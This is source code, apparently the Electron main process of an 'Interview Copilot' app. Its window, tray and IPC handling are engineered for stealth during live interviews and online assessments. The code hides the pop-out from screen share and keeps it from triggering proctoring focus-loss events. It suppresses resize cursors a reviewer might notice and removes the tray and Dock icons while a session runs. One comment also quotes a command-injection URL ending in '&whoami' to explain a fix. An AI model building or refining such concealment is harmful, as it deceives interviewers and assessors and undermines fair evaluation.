      // (or delete-if-empty) the active conversation so the next launch
      // opens to a fresh empty session. This is the token-saving design
      // — each interview becomes its own session, history doesn't grow
      // unbounded across days.
      const popoutInUse = popoutWindow && !popoutWindow.isDestroyed();
      if (!popoutInUse) {
        endSessionCleanly();
      }
      // Tell the renderer we're hiding to the tray so it can show a
      // first-time toast with the "right-click the slot to bring it back"
      // tip. Sent BEFORE the smoothHide() begins so the renderer can paint
      // the toast in the popout (which stays visible) in sync with the
      // main window's fade-out — they animate together rather than the
      // toast popping in mid-fade.
      try { mainWindow.webContents.send('app-hidden-to-tray'); } catch {}
      // smoothHide animates opacity 1→0 over 160ms then calls hide().
      // OS notification fires AFTER the window is fully hidden so the
      // toast doesn't compete visually with a still-fading window.
      smoothHide(mainWindow, () => notifyHiddenToTray());
      return;
    }
    // Pending update — ask in-app instead of via native dialog.
    // dialog.showMessageBox is a separate Win32 HWND that is NOT covered by
    // setContentProtection and would leak the app's existence + version
    // string to anyone watching the screen-share. We send to the renderer
    // and let the React modal handle the choice; the renderer relays the
    // user's pick back via 'install-update' (install) or 'close-window'
    // (stay in tray, fall through to plain hide).
    try {
      mainWindow.webContents.send('show-update-prompt', {
        version: pendingUpdate.version,
      });
    } catch {
      // If renderer is gone for any reason, fall back to plain hide rather
      // than open a native dialog (which would still leak).
      smoothHide(mainWindow);
    }
  });

  mainWindow.once('ready-to-show', () => {
    // First appearance on cold launch — fade in smoothly rather than
    // snapping to full opacity. Subsequent show/hide cycles use the
    // same helper for visual consistency with hotkey/tray paths.
    smoothShow(mainWindow);
  });

  // ── Window-open + will-navigate hardening ─────────────────────
  // Without these, a markdown link (or any DOM-injected <a target=_blank>
  // or window.open call) can spawn a child BrowserWindow that INHERITS
  // mainWindow's webPreferences (contextIsolation, preload bridge). Same
  // hazard for navigation: a click on `<a href="https://attacker">` would
  // navigate the renderer AWAY from dist/index.html, dropping the user
  // into an attacker-controlled page that still has access to our preload
  // bridge. Block both — open external URLs in the OS browser via
  // shell.openExternal (with allowlisted protocols), refuse navigation
  // away from the dev server / packaged dist URL.
  attachNavigationGuards(mainWindow.webContents, isDev);

  // Load the full app
  if (isDev) {
    mainWindow.loadURL('http://localhost:3005');
  } else {
    mainWindow.loadFile(path.join(__dirname, '../dist/index.html'));
  }

  // ── Keep the Auto-Type entitlement claim warm ──
  // Started here because this is the first moment the app has both a
  // renderer to read the signed-in token from and a network it is allowed
  // to use. Fire-and-forget by construction: the refresher waits 20s, skips
  // itself entirely while a session is live, and swallows every failure —
  // nothing in it can delay or break startup. It is idempotent, so the
  // tray-restore / macOS-'activate' paths that call createMainWindow again
  // do not stack a second timer. See autoTypeStartEntitlementRefresh.
  //
  // Wrapped because this call sits ~2,500 lines ABOVE the const declarations
  // it depends on. That is fine today — every createMainWindow() call site is
  // inside a callback, so the module has finished evaluating — but a future
  // call during module evaluation would hit the temporal dead zone, and an
  // entitlement refresher must never be the reason a window fails to open.
  try { autoTypeStartEntitlementRefresh(); } catch (e) {
    console.warn('[auto-type] entitlement refresher failed to start:', e && e.message);
  }

  mainWindow.on('closed', () => {
    mainWindow = null;
    // Close popout if main closes
    if (popoutWindow && !popoutWindow.isDestroyed()) {
      popoutWindow.close();
    }
  });
}

// ───────────────────────────────────────────────
//  POP-OUT WINDOW — Transparent, frameless, compact
//  ALWAYS on top. Hidden from taskbar + screen share.
// ───────────────────────────────────────────────
let alwaysOnTopInterval = null;

function enforceAlwaysOnTop() {
  if (popoutWindow && !popoutWindow.isDestroyed()) {
    // 'screen-saver' is the HIGHEST level — above all apps, even fullscreen
    popoutWindow.setAlwaysOnTop(true, 'screen-saver');
    // Re-assert WS_EX_TOOLWINDOW. setFocusable(true) on Windows clears
    // the toolwindow flag set by skipTaskbar:true at construction, and
    // a subsequent setFocusable(false) does NOT put it back — once the
    // flag is gone the popout sits in the taskbar for the rest of its
    // lifetime, blowing the screen-share-stealth invariant. Belt-and-
    // suspenders re-assert here so any code path that drops the flag
    // (focus toggles, alwaysOnTop changes, content-protection, parent-
    // window relations) gets corrected within the next event tick.
    popoutWindow.setSkipTaskbar(true);
    // ── macOS: re-assert Spaces behavior AFTER setAlwaysOnTop ──
    // Floating above ANOTHER app's fullscreen on macOS needs TWO things:
    // a high window LEVEL ('screen-saver', set above) AND a collection
    // BEHAVIOR that lets the window join the fullscreen Space
    // (canJoinAllSpaces + fullScreenAuxiliary, set via
    // setVisibleOnAllWorkspaces). The catch: setAlwaysOnTop() RESETS the
    // collection behavior, so a one-shot call at popout-creation gets
    // clobbered the instant this re-assert first runs — and again on every
    // 2s tick / blur / focus / move / resize. Re-applying it HERE, right
    // after the level, keeps the two in lock-step so the popout reliably
    // floats over fullscreen apps (Zoom/Meet/Teams, a fullscreen browser
    // assessment) and follows the user across Spaces. Order matters:
    // workspaces MUST come after the level. Gated to darwin for explicit
    // intent (the API is a no-op on Windows; Spaces is a Mac construct).
    // Wrapped so a transient Cocoa error can never crash the always-on-top
    // safety net that the rest of the app's stealth depends on.
    if (process.platform === 'darwin') {
      try {
        popoutWindow.setVisibleOnAllWorkspaces(true, { visibleOnFullScreen: true });
      } catch (e) {
        electronLog.warn('[popout] setVisibleOnAllWorkspaces failed:', e && e.message);
      }
    }
  }
}

function createPopoutWindow(options = {}) {
  if (popoutWindow && !popoutWindow.isDestroyed()) {
    popoutWindow.focus();
    enforceAlwaysOnTop();
    return;
  }

  // Multi-monitor + DPI-aware default position. Centers on whichever
  // display the user's cursor is currently on, clamped to that display's
  // work area so the popout can never spawn off-screen.
  //
  // Why this changed from "anchor to bottom-right of primary display":
  // the old math (`screenH - popH - 30` against `workAreaSize`) silently
  // produced a NEGATIVE y on high-DPI laptops — Windows reports
  // workAreaSize in logical pixels, which on a 1366x768 laptop at 150%
  // scale is roughly 911x466. With popH=700 the y came out at
  // 466 - 700 - 30 = -264, putting the popout above the visible region.
  // Users saw the popout "open hidden / off the top of the screen."
  //
  // Centering on the cursor's display + Math.min clamps avoids both the
  // negative-y bug AND the multi-monitor case where the popout would
  // open on the primary even though the user is on a secondary screen.
  // workArea origin can be non-zero on multi-monitor — always offset by
  // wa.x / wa.y, never assume (0,0) is the top-left of the target display.
  //
  // Stealth properties (setContentProtection, focusable=false, alwaysOnTop,
  // skipTaskbar, transparent, etc.) are independent of position — moving
  // the spawn point from corner to center does NOT affect screen-share
  // invisibility. The OS-level content-protection flag still excludes
  // this HWND from capture APIs regardless of where it sits.
  const cursorPt = screen.getCursorScreenPoint();
  const targetDisplay = screen.getDisplayNearestPoint(cursorPt);
  const wa = targetDisplay.workArea; // { x, y, width, height }
  const popW = Math.min(options.width || 450, wa.width);
  const popH = Math.min(options.height || 700, wa.height);
  const popX = wa.x + Math.round((wa.width  - popW) / 2);
  const popY = wa.y + Math.round((wa.height - popH) / 2);

  popoutWindow = new BrowserWindow({
    width: popW,
    height: popH,
    x: popX,
    y: popY,
    minWidth: 320,
    minHeight: 400,
    maxWidth: 800,
    maxHeight: 1000,
    // --- TRANSPARENCY ---
    transparent: true,
    frame: false,
    hasShadow: false,
    // --- END TRANSPARENCY ---
    alwaysOnTop: true,
    // STEALTH for screen-share: OS resize cursors are rendered by the
    // OS over EVERYTHING (they ignore setContentProtection — the cursor
    // is drawn by Windows above all windows, content-protected or not).
    // With native resizable:true the user moving their cursor from the
    // popout to a code editor naturally crosses the LEFT side resize
    // hit-area and the cursor flashes to ↔ for a moment. A reviewer
    // watching the screen-share would see "why did the cursor change to
    // a resize arrow on empty space?" and start asking questions.
    //
    // Solution: disable native resize entirely (kills the OS resize
    // cursor on all four edges + corners), then re-add resize ONLY on
    // top/bottom edges + four corners via JS handles in the popout
    // renderer (see the popout-resize useEffect in App.tsx, plus the
    // popout:resize-* IPC handlers below). Side edges have no JS
    // handles and no OS resize → cursor stays default arrow on
    // horizontal cursor traversal.
    resizable: false,
    skipTaskbar: true,     // ← HIDDEN from taskbar
    // CRITICAL for stealth: focusable=false means clicking on this popout
    // does NOT steal focus from whatever the user was working in (e.g., a
    // browser-based coding assessment like Ropes.ai). Without this, every
    // click on a popout button fires `window.onblur` on the browser tab,
    // which proctoring stacks log as a focus-loss / suspicious-activity
    // event. On Windows this maps to WS_EX_NOACTIVATE — mouse events still
    // reach the WebContents (so buttons work), but the window never
    // becomes the foreground HWND.
    //
    // Trade-off: text inputs (textarea/input) inside the popout can't
    // receive keyboard input while the window is non-focusable. We
    // restore focusability on demand via the 'popout:set-focusable' IPC
    // channel below — the renderer toggles it when a text input is
    // clicked, and releases it when the input blurs. So the rare typing
    // case still works at the cost of one focus-loss event (acceptable
    // since it's user-initiated, not background activity).
    focusable: false,
    webPreferences: {
      // Same sandboxed-renderer config as the main window — see the comment
      // there for the security rationale.
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.cjs'),
      // Same rationale as main window — unprotected DevTools HWND would
      // bypass setContentProtection on the popout during screen-share.
      devTools: isDev,
      // The popout is the visible surface during an interview, but it can
      // still be occluded / blurred; keep its timers full-rate too so any
      // renderer-side capture/timer logic mirrored here isn't throttled.
      backgroundThrottling: false,
    },
    title: 'Interview Copilot — Pop-out',
    show: false,
  });

  // INVISIBLE TO SCREEN SHARE
  popoutWindow.setContentProtection(true);

  // ── macOS: follow Spaces and float above fullscreen ──
  // The popout must (a) follow the user across Spaces — a Mission Control /
  // 4-finger swipe during an interview must not strand it on the Space it
  // was opened in — and (b) sit above a fullscreen Zoom/Meet/Teams call or
  // a fullscreen browser-based assessment. Both come from
  // setVisibleOnAllWorkspaces(true,{visibleOnFullScreen:true}). It is NOT
  // called here as a one-shot anymore: setAlwaysOnTop() resets that
  // collection behavior, so it has to be re-applied AFTER every
  // setAlwaysOnTop. That now lives inside enforceAlwaysOnTop() (called
  // immediately below, and on the 2s interval + window events), which
  // applies the window level and the Spaces/fullscreen behavior together
  // in the correct order. No-op on Windows/Linux.

  // Set highest always-on-top level immediately (also applies the macOS
  // Spaces + visibleOnFullScreen behavior described above).
  enforceAlwaysOnTop();

  // ── ROBUST ALWAYS-ON-TOP ──
  // Re-enforce after ANY event that might drop it

  // After losing and regaining focus
  popoutWindow.on('blur', () => {
    setTimeout(enforceAlwaysOnTop, 50);
  });

  popoutWindow.on('focus', () => {
    enforceAlwaysOnTop();
  });

  // After window is moved (dragging can reset z-order)
  popoutWindow.on('moved', () => {
    enforceAlwaysOnTop();
  });

  // After resize
  popoutWindow.on('resize', () => {
    enforceAlwaysOnTop();
  });

  // After minimize/restore
  popoutWindow.on('restore', () => {
    enforceAlwaysOnTop();
  });

  popoutWindow.on('show', () => {
    enforceAlwaysOnTop();
  });

  // Periodic enforcement every 2 seconds as a safety net
  if (alwaysOnTopInterval) clearInterval(alwaysOnTopInterval);
  alwaysOnTopInterval = setInterval(() => {
    enforceAlwaysOnTop();
  }, 2000);

  popoutWindow.once('ready-to-show', () => {
    popoutWindow.show();
    enforceAlwaysOnTop();
  });

  // Same navigation hardening as the main window — markdown links inside
  // the popout chat get the same external-only treatment.
  attachNavigationGuards(popoutWindow.webContents, isDev);

  // Load the app in popout mode
  if (isDev) {
    popoutWindow.loadURL('http://localhost:3005?mode=popout');
  } else {
    popoutWindow.loadURL(`file://${path.join(__dirname, '../dist/index.html')}?mode=popout`);
  }

  popoutWindow.on('closed', () => {
    // Stop the periodic enforcement
    if (alwaysOnTopInterval) {
      clearInterval(alwaysOnTopInterval);
      alwaysOnTopInterval = null;
    }
    popoutWindow = null;
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('popout-closed');
    }
  });
}

// ───────────────────────────────────────────────
//  IPC HANDLERS
// ───────────────────────────────────────────────

// Drain the buffered Google sign-in handoff (see receiveProtocolUrl).
// The renderer calls this when it opens the sign-in screen and again
// each poll tick, which covers the cold-start case where the protocol
// URL arrived before any window existed to receive the broadcast.
//
// Read-once: handing the same code out twice serves nothing (the server
// burns it on first redemption) and holding it lets a stale handoff
// interfere with the next sign-in attempt.
ipcMain.handle('auth:consume-google-handoff', () => {
  const handoff = pendingGoogleHandoff;
  pendingGoogleHandoff = null;
  // 5 minutes matches the server's pending-session TTL — anything older
  // is already dead server-side, so returning it would only produce a
  // confusing "invalid code" instead of a clean fall-through.
  if (!handoff || Date.now() - handoff.receivedAt > 5 * 60 * 1000) return null;
  return { sessionId: handoff.sessionId, code: handoff.code };
});

// Desktop capturer — renderer can't access this directly in Electron 17+
ipcMain.handle('get-desktop-sources', async () => {
  const sources = await desktopCapturer.getSources({
    types: ['window', 'screen'],
    thumbnailSize: { width: 150, height: 150 }
  });
  // Return serializable data (thumbnails are NativeImage, can't be sent directly)
  return sources.map(s => ({ id: s.id, name: s.name }));
});

// Robust external-URL opener — tries multiple OS-level launch paths and
// returns a structured result so the renderer can show diagnostic info.
//
// Why this exists: shell.openExternal() can silently fail on Windows when
// the default-browser registration is corrupted, when ShellExecuteW hangs
// for non-obvious reasons (AV interference, OS shell process busy), or
// when the returned Promise just never resolves. The fire-and-forget
// pattern in older code meant a failed browser launch left the user
// staring at a forever-spinner during Google sign-in. This handler:
//   1. Tries shell.openExternal first (the standard path)
//   2. On failure, falls back to child_process spawn — on Windows that's
//      `rundll32 url.dll,FileProtocolHandler <URL>`, which reaches the
//      shell's protocol table down a different code path than Win32
//      ShellExecuteEx; if ShellExecuteEx is broken, this still often
//      works. It used to be `cmd /c start "" "URL"` — see the win32
//      branch for why that had to go.
//      On macOS we use `open <url>`, on Linux `xdg-open <url>`.
//   3. Returns { ok, method, error, attempts } so the renderer can show
//      the user what was tried and why it failed.
ipcMain.handle('open-external-robust', async (_event, url) => {
  const attempts = [];

  // Validate URL upfront — same allowlist as the legacy preload helper.
  let parsed;
  try {
    parsed = new URL(url);
  } catch {
    return { ok: false, method: 'none', error: 'Invalid URL', attempts };
  }
  if (!['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
    return { ok: false, method: 'none', error: `Protocol ${parsed.protocol} not allowed`, attempts };
  }

  // Method 1: shell.openExternal with 6s timeout race
  try {
    const openPromise = shell.openExternal(url);
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('shell.openExternal timed out (6s)')), 6000)
    );
    await Promise.race([openPromise, timeoutPromise]);
    attempts.push({ method: 'shell.openExternal', ok: true });
    return { ok: true, method: 'shell.openExternal', attempts };
  } catch (err) {
    const msg = (err && err.message) || String(err);
    electronLog.warn('[open-external] shell.openExternal failed:', msg);
    attempts.push({ method: 'shell.openExternal', ok: false, error: msg });
  }

  // Method 2: OS-specific child_process spawn fallback. We wait briefly
  // for the 'error' event because failures like ENOENT (xdg-open missing
  // on a stripped Linux install) fire asynchronously on next tick — if
  // we returned immediately after spawn() we'd report ok:true even when
  // the launch actually failed.
  const platform = process.platform;
  const spawnLabel = `child_process.spawn (${platform})`;
  try {
    const spawnResult = await new Promise((resolve) => {
      let child;
      try {
        if (platform === 'win32') {
          // NOT `cmd.exe /s /c start "" <url>` any more, and it can never
          // come back. Node hands argv to CreateProcess through libuv's
          // quote_cmd_arg, which only quotes an argument containing a
          // space, a tab or a quote — so an `&` inside the URL arrives at
          // cmd RAW and cmd reads it as a command separator. `/s` turns off
          // the quote-preserving rule on top of that. A URL of the shape
          // `https://host/a&whoami` therefore truncated at the `&` and cmd
          // EXECUTED the tail; reproduced by swapping `start` for `echo` —
          // it printed the short URL and then printed machine\user. Neither
          // guard above catches it: `new URL()` is perfectly happy with `&`
          // in a path, and the protocol allowlist only looks at the scheme.
          // (The lore for the old form, for anyone tempted: the empty `""`
          // was start's title argument — without it start read the quoted
          // URL as a window title and silently did nothing.)
          //
          // rundll32 takes the URL as a plain argv entry. There is no shell
          // in the path, so there is no separator to inject and nothing to
          // truncate, and url.dll,FileProtocolHandler goes through the same
          // ShellExecute protocol table — it opens http/https AND mailto:,
          // which matters because mailto: is in the allowlist above and is
          // the case most likely to reach this fallback (a machine with no
          // mail client registered fails method 1 every time).
          //
          // We pass parsed.href, not the raw renderer string: normalized and
          // percent-encoded, so what actually launches is what we validated.
          //
          // Resolve the binary out of %SystemRoot%\System32 instead of
          // trusting PATH — a PATH that has lost its System32 entry is a
          // real Windows state, and it would turn this fallback into a
          // pointless ENOENT. windowsHide:true keeps any console window
          // from flashing into view.
          const sysRoot = process.env.SystemRoot || process.env.windir;
          const rundll32Exe = sysRoot
            ? path.join(sysRoot, 'System32', 'rundll32.exe')
            : 'rundll32.exe';
          child = spawn(rundll32Exe, ['url.dll,FileProtocolHandler', parsed.href], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true,
          });
        } else if (platform === 'darwin') {
          child = spawn('open', [url], { detached: true, stdio: 'ignore' });
        } else {
          child = spawn('xdg-open', [url], { detached: true, stdio: 'ignore' });
        }
      } catch (syncErr) {
        // spawn can throw synchronously on bad args. ENOENT and similar
        // are async and handled by the 'error' listener below.
        resolve({ ok: false, error: (syncErr && syncErr.message) || String(syncErr) });
        return;
      }

      let settled = false;
      child.on('error', (err) => {
        if (settled) return;
        settled = true;
        resolve({ ok: false, error: (err && err.message) || String(err) });
      });
      // 150ms is enough for ENOENT-style errors to surface (they fire on
      // next tick) without delaying the user noticeably. If we make it
      // through the window, the spawned process is alive enough that the
      // OS will handle the URL launch on its own.
      setTimeout(() => {
        if (settled) return;
        settled = true;
        try { child.unref(); } catch {}
        resolve({ ok: true });
      }, 150);
    });

    if (spawnResult.ok) {
      attempts.push({ method: spawnLabel, ok: true });
      return { ok: true, method: spawnLabel, attempts };
    }
    electronLog.error('[open-external] spawn fallback failed:', spawnResult.error);
    attempts.push({ method: spawnLabel, ok: false, error: spawnResult.error });
    // Both methods failed — return a combined error so the renderer can
    // surface every attempted method to the user for support diagnosis.
    const allErrors = attempts.filter(a => !a.ok).map(a => `${a.method}: ${a.error}`).join('; ');
    return { ok: false, method: 'all', error: allErrors, attempts };
  } catch (outerErr) {
    const msg = (outerErr && outerErr.message) || String(outerErr);
    electronLog.error('[open-external] spawn outer error:', msg);
    attempts.push({ method: spawnLabel, ok: false, error: msg });
    return { ok: false, method: spawnLabel, error: msg, attempts };
  }
});

// Pop-out window management
ipcMain.on('open-popout', (_event, options) => {
  createPopoutWindow(options);
  // Notify main window
  if (mainWindow && !mainWindow.isDestroyed()) {
    mainWindow.webContents.send('popout-opened');
  }
});

ipcMain.on('close-popout', () => {
  if (popoutWindow && !popoutWindow.isDestroyed()) {
    popoutWindow.close();
  }
});

// Window controls (for frameless pop-out)
ipcMain.on('minimize-window', (event) => {
  const win = BrowserWindow.fromWebContents(event.sender);
  if (win) win.minimize();
});

ipcMain.on('close-window', (event) => {
  const win = BrowserWindow.fromWebContents(event.sender);
  if (win) win.close();
});

// Decision back from the in-app update-on-close prompt. We can't reuse
// 'close-window' because that would re-fire the close handler and loop
// the prompt. 'install' triggers the deferred installer (which quits +
// relaunches); 'dismiss' just hides the main window to the tray.
//
// Either way, clear pendingUpdate after the decision so the close handler
// stops re-prompting on subsequent close attempts. Without this clear, a
// user who picked "Stay in tray" once would be re-prompted on every close,
// and if they kept dismissing, the app would feel unquittable (close
// always opens the prompt; Stay in tray never quits; Quit from the tray
// also fires close which re-prompts).
ipcMain.on('update-prompt-decision', (_event, payload) => {
  const decision = payload && payload.decision;
  if (decision === 'install' && installPendingUpdate) {
    try { installPendingUpdate(); } catch {}
  } else if (mainWindow && !mainWindow.isDestroyed()) {
    try { mainWindow.webContents.send('app-hidden-to-tray'); } catch {}
    smoothHide(mainWindow, () => notifyHiddenToTray());
  }
  // After this decision the user has acknowledged the pending update.
  // Don't keep the prompt sticky — it'll re-arm naturally when a NEW
  // update finishes downloading and assigns pendingUpdate again.
  pendingUpdate = null;
  installPendingUpdate = null;
});

// Resize pop-out — keeps window on-screen and animates
ipcMain.on('resize-popout', (_event, { width, height }) => {
  if (popoutWindow && !popoutWindow.isDestroyed()) {
    // ── Clamp against the display the popout is ACTUALLY on ──
    // This read getPrimaryDisplay().workAreaSize, which returns a bare
    // {width,height} with no origin — then compared the popout's ABSOLUTE
    // x against it. createPopoutWindow places the popout on the display
    // nearest the cursor (getDisplayNearestPoint above), so on any
    // multi-monitor setup — a laptop plus an external monitor, which is
    // the normal interview desk — those two disagree.
    //
    // What the user saw: popout open on the second monitor at x=2000,
    // press the S/M/L size button, and `2000 + 450 > 1920` fires the
    // "push back on-screen" branch, teleporting the window onto the
    // primary display mid-interview. A monitor to the LEFT of primary
    // (negative x) got yanked the same way by the `newX < 0` branch.
    //
    // workArea (not workAreaSize) carries x/y, so the comparisons are
    // now in the same coordinate space as the window's own bounds.
    const display = screen.getDisplayMatching(popoutWindow.getBounds());
    const wa = display.workArea; // { x, y, width, height } — absolute
    const [currentX, currentY] = popoutWindow.getPosition();

    const newW = Math.min(width, wa.width - 20);
    const newH = Math.min(height, wa.height - 20);
    let newX = currentX;
    let newY = currentY;

    // Push back on-screen if needed — within THIS display's work area.
    if (newX + newW > wa.x + wa.width) newX = wa.x + wa.width - newW - 10;
    if (newY + newH > wa.y + wa.height) newY = wa.y + wa.height - newH - 10;
    if (newX < wa.x) newX = wa.x + 10;
    if (newY < wa.y) newY = wa.y + 10;

    popoutWindow.setBounds({ x: newX, y: newY, width: newW, height: newH }, true);
    // Re-enforce after resize
    setTimeout(enforceAlwaysOnTop, 100);
  }
});

// Toggle always-on-top for pop-out
ipcMain.on('set-always-on-top', (_event, flag) => {
  if (popoutWindow && !popoutWindow.isDestroyed()) {
    if (flag) {
      enforceAlwaysOnTop();
    } else {
      popoutWindow.setAlwaysOnTop(false);
    }
  }
});

// ─── Custom resize for the popout ──────────────────────────────────
// Native resize is disabled (resizable:false on the BrowserWindow) so
// the OS doesn't draw resize cursors on the side edges during a
// screen-share. We re-add resize only on top/bottom/corners via JS
// handles in the renderer; those handles drive these IPC handlers.
//
// Protocol: renderer sends `popout:resize-start` once on mousedown
// (with the edge identifier and the screen-pixel cursor position),
// streams `popout:resize-move` on every mousemove (current screen-pixel
// cursor position), and finally `popout:resize-end` on mouseup. We
// hold the captured starting bounds in module scope and apply deltas
// in screen pixels — this avoids the popout's own mouse coords drifting
// as the window moves under the cursor mid-resize.
let _popoutResize = null;

function clampPopoutBounds(b) {
  const W_MIN = 320, W_MAX = 800, H_MIN = 400, H_MAX = 1000;
  return {
    x: Math.round(b.x),
    y: Math.round(b.y),
    width: Math.max(W_MIN, Math.min(W_MAX, Math.round(b.width))),
    height: Math.max(H_MIN, Math.min(H_MAX, Math.round(b.height))),
  };
}

ipcMain.on('popout:resize-start', (_event, payload) => {
  if (!popoutWindow || popoutWindow.isDestroyed()) return;
  if (!payload || typeof payload.screenX !== 'number') return;
  const validEdges = ['top', 'bottom', 'tl', 'tr', 'bl', 'br'];
  if (!validEdges.includes(payload.edge)) return;
  _popoutResize = {
    edge: payload.edge,
    startX: payload.screenX,
    startY: payload.screenY,
    startBounds: popoutWindow.getBounds(),
  };
});

ipcMain.on('popout:resize-move', (_event, payload) => {
  if (!_popoutResize || !popoutWindow || popoutWindow.isDestroyed()) return;
  if (!payload || typeof payload.screenX !== 'number') return;
  const dx = payload.screenX - _popoutResize.startX;
  const dy = payload.screenY - _popoutResize.startY;
  const sb = _popoutResize.startBounds;
  const e = _popoutResize.edge;

  let nb = { x: sb.x, y: sb.y, width: sb.width, height: sb.height };

  // Top edge (top, tl, tr) — y moves down by dy, height shrinks by dy
  if (e === 'top' || e === 'tl' || e === 'tr') {
    nb.y = sb.y + dy;
    nb.height = sb.height - dy;
  }
  // Bottom edge (bottom, bl, br) — height grows by dy
  if (e === 'bottom' || e === 'bl' || e === 'br') {
    nb.height = sb.height + dy;
  }
  // Left side (tl, bl) — x moves right by dx, width shrinks by dx
  if (e === 'tl' || e === 'bl') {
    nb.x = sb.x + dx;
    nb.width = sb.width - dx;
  }
  // Right side (tr, br) — width grows by dx
  if (e === 'tr' || e === 'br') {
    nb.width = sb.width + dx;
  }

  // After clamping width/height, fix up x/y if a top/left drag would
  // have shrunk past the min — without this the user can drag the
  // top edge down past the min height and the y still moves, so the
  // window slides off where the bottom edge "should" be.
  const clamped = clampPopoutBounds(nb);
  if ((e === 'top' || e === 'tl' || e === 'tr') && clamped.height !== nb.height) {
    clamped.y = sb.y + (sb.height - clamped.height);
  }
  if ((e === 'tl' || e === 'bl') && clamped.width !== nb.width) {
    clamped.x = sb.x + (sb.width - clamped.width);
  }

  try { popoutWindow.setBounds(clamped); } catch {}
});

ipcMain.on('popout:resize-end', () => {
  _popoutResize = null;
});

// Toggle popout focusability on demand — see the long comment on the
// popoutWindow constructor. Renderer sends `true` when the user clicks a
// text input inside the popout (so keyboard input can reach it) and
// `false` when the input blurs (so subsequent button clicks don't steal
// focus from whatever the user was working in). Idempotent — calling
// setFocusable repeatedly with the same value is cheap.
ipcMain.on('popout:set-focusable', (_event, focusable) => {
  if (popoutWindow && popoutWindow.isDestroyed()) return;
  if (!popoutWindow) return;
  try {
    popoutWindow.setFocusable(!!focusable);
    // CRITICAL: setFocusable(true) on Windows rewrites GWL_EXSTYLE and
    // strips WS_EX_TOOLWINDOW (the flag skipTaskbar:true sets at
    // construction). A later setFocusable(false) does NOT restore it.
    // Re-assert synchronously here, BEFORE the focus() call below — any
    // delay would let the icon flash into the taskbar long enough for a
    // screen-share viewer (or the user themselves) to see it.
    popoutWindow.setSkipTaskbar(true);
    if (focusable) {
      // Bring popout to the foreground so the focused text input actually
      // receives keyboard input from the OS — without this, even a focused
      // textarea would still route keys to whatever was previously
      // foreground (the browser).
      popoutWindow.focus();
    }
    // macOS: setFocusable() can also reset the window's Spaces collection
    // behavior. The focusable=true path re-asserts it via the 'focus'
    // event (focus() above → enforceAlwaysOnTop), but the focusable=false
    // path fires no focus event — so re-assert explicitly here too.
    // enforceAlwaysOnTop re-applies BOTH the always-on-top level and the
    // visibleOnFullScreen behavior, so the popout keeps floating over a
    // fullscreen host app while the user toggles text-input focus. On
    // Windows this is just a harmless re-assert of the level + toolwindow
    // flag (already set above).
    enforceAlwaysOnTop();
  } catch (err) {
    electronLog.warn('[popout:set-focusable] setFocusable threw:', err && err.message);
  }
});

// After a browser-based Google Sign-In completes, the renderer polls the
// server and then asks Electron to surface the main window so the user
// doesn't have to alt-tab back from the browser "close tab" page.
ipcMain.on('focus-main-window', () => {
  if (mainWindow && !mainWindow.isDestroyed()) {
    smoothShow(mainWindow);
    mainWindow.moveTop();
    // Briefly flash always-on-top to beat the OS focus-stealing guard,
    // then release it so the window doesn't stay pinned.
    mainWindow.setAlwaysOnTop(true);
    setTimeout(() => {
      if (mainWindow && !mainWindow.isDestroyed()) mainWindow.setAlwaysOnTop(false);
    }, 500);
  }
});

// Relay messages between windows (main <-> popout)
ipcMain.on('relay-to-popout', (_event, data) => {
  if (popoutWindow && !popoutWindow.isDestroyed()) {
    popoutWindow.webContents.send('from-main', data);
  }
});

ipcMain.on('relay-to-main', (_event, data) => {
  if (mainWindow && !mainWindow.isDestroyed()) {
    mainWindow.webContents.send('from-popout', data);
  }
});

// ───────────────────────────────────────────────
//  SESSION-ACTIVE (screen-share security)
// ───────────────────────────────────────────────
// When the renderer flips into "listening" (interview live, screen
// share likely on), the tray icon and its context menu MUST disappear
// from the OS shell — both are rendered by Windows / macOS outside
// Electron's setContentProtection scope and would otherwise show up
// in the screen-share frame, revealing both the existence of the app
// and any menu labels the user happened to right-click.
//
// Strategy: on session-active=true, destroy the tray entirely so the
// icon vanishes from the system tray. On false, recreate it. The
// renderer is the source of truth — `isListening` flipping there
// drives this. If the renderer crashes mid-session the tray stays
// hidden, which is a safer failure mode than the inverse.
let sessionActive = false;
// Periodic tray-menu refresh handle. Tracked at module scope so we can
// clear it from session-active (which destroys the tray) and from each
// createTray() call (which would otherwise stack a new interval on every
// session-end → leaking intervals + multiplying crash surface).
let trayMenuInterval = null;
ipcMain.on('session-active', (_event, payload) => {
  const next = !!(payload && payload.active);
  if (next === sessionActive) return;
  sessionActive = next;
  if (sessionActive) {
    // Keep the display awake for the whole session so capture (and the
    // mic with it) can't die to a screen sleep / lock. See the blocker
    // helpers up top.
    startDisplaySleepBlocker();
    // Tear down the tray. createTray re-attaches on session-end.
    // Stop the periodic menu refresh first — otherwise the next tick
    // calls tray.setContextMenu() on null and crashes the main process
    // with an uncaught TypeError that pops a blocking native dialog.
    if (trayMenuInterval) {
      clearInterval(trayMenuInterval);
      trayMenuInterval = null;
    }
    if (tray && !tray.isDestroyed()) {
      try { tray.destroy(); } catch {}
    }
    tray = null;

    // ── macOS: hide the Dock icon while the session is live ──
    // setSkipTaskbar(true) does nothing on Mac (it's a Win32 API), so
    // without this the app's icon + name remain visible in the Dock
    // throughout the interview. Cmd+Tab and Mission Control both expose
    // it. setContentProtection blacks out the window's contents on
    // screen-share, but it does nothing for the Dock — that's a
    // separate OS-level surface. Hiding the Dock icon closes the only
    // remaining "Interview Copilot is running" leak on Mac. The Dock
    // icon comes back when the session ends (below).
    if (process.platform === 'darwin' && app.dock) {
      try { app.dock.hide(); } catch (e) {
        electronLog.warn('[dock] hide failed:', e && e.message);
      }
    }
  } else {
    // Session ended — let the display sleep normally again.
    stopDisplaySleepBlocker();
    // Re-create only if app is still running and tray is gone.
    if (!tray && typeof createTray === 'function') {
      try { createTray(); } catch (err) {
        electronLog.warn('[tray] re-create after session-end failed:', err.message);
      }
    }
    // ── macOS: restore the Dock icon at session end ──
    // Symmetric to the hide above. Belt-and-suspenders: app.dock.show()
    // is also called when the user explicitly quits or when the tray
    // is rebuilt below — but doing it here keeps the dock state tied
    // to the same lifecycle event the tray uses, so rebooting Dock +
    // tray together stays consistent.
    if (process.platform === 'darwin' && app.dock) {
      try { app.dock.show(); } catch (e) {
        electronLog.warn('[dock] show failed:', e && e.message);
      }
    }
  }
});

